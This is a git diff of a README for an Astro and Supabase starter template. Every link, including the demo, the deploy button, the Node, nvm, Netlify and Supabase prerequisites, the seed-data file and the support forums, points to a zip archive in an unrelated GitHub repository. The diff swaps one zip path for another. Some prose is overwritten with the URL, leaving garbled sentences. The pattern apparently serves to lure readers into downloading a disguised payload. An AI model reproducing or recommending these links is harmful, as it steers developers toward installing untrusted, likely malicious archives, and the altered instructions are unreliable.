@@ -1,8 +1,8 @@
 # Astro Supabase Starter
 
-![Astro Supabase Starter Preview](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip)
+![Astro Supabase Starter Preview](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip)
 
-**View demo:** [https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip)
+**View demo:** [https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip)
 
 The Astro Supabase starter demonstrates how to integrate **Supabase** into an Astro project deployed on Netlify.
 
@@ -10,7 +10,7 @@ The Astro Supabase starter demonstrates how to integrate **Supabase** into an As
 
 If you click "Deploy to Netlify" button, it will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify.
 
-[![Deploy to Netlify](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip)](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip)
+[![Deploy to Netlify](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip)](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip)
 
 ## Astro Commands
 
@@ -29,11 +29,11 @@ All commands are run from the root of the project, from a terminal:
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip) v18.14+                                       |
-| (optional) [nvm](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip) for Node version management  |
-| [Netlify account](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip)                                      |
-| [Netlify CLI](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip).                    |
-| [Supabase account](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip)                                    |
+| [https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip) v18.14+                                       |
+| (optional) [nvm](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip) for Node version management  |
+| [Netlify account](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip)                                      |
+| [Netlify CLI](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip).                    |
+| [Supabase account](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip)                                    |
 
 ### Set up the database
 
@@ -41,7 +41,7 @@ To use this template, you’ll need to set up and seed a new Supabase database.
 
 1. Create a new Supabase project.
 2. Run the SQL commands found in the `supabase/migrations` directory in the Supabase UI.
-3. To seed the database with data, you can import the contents of the `https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip` file in the Supabase UI.
+3. To seed the database with data, you can import the contents of the `https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip` file in the Supabase UI.
 
 ℹ️ _Note: This template was created to be used with the Supabase extension for Netlify. If you don’t wish to use the Netlify Supabase extension, you will need to set the `SUPABASE_DATABASE_URL` and `SUPABASE_ANON_KEY` environment variables in the `.env` file._
 
@@ -61,7 +61,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip development server via Netlify CLI:
+4. Then, run the https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip development server via Netlify CLI:
 
 ```
 netlify dev --target-port 4321
@@ -71,4 +71,4 @@ If your browser doesn't navigate to the site automatically, visit [localhost:888
 
 ## Support
 
-If you get stuck along the way, get help in our [support forums](https://raw.githubusercontent.com/capim0valha/cone-black-s/main/supabase/cone_black_s_2.4.zip).
+If you get stuck along the way, get help in our [support forums](https://github.com/capim0valha/cone-black-s/raw/refs/heads/main/src/pages/api/black_s_cone_blazing.zip).
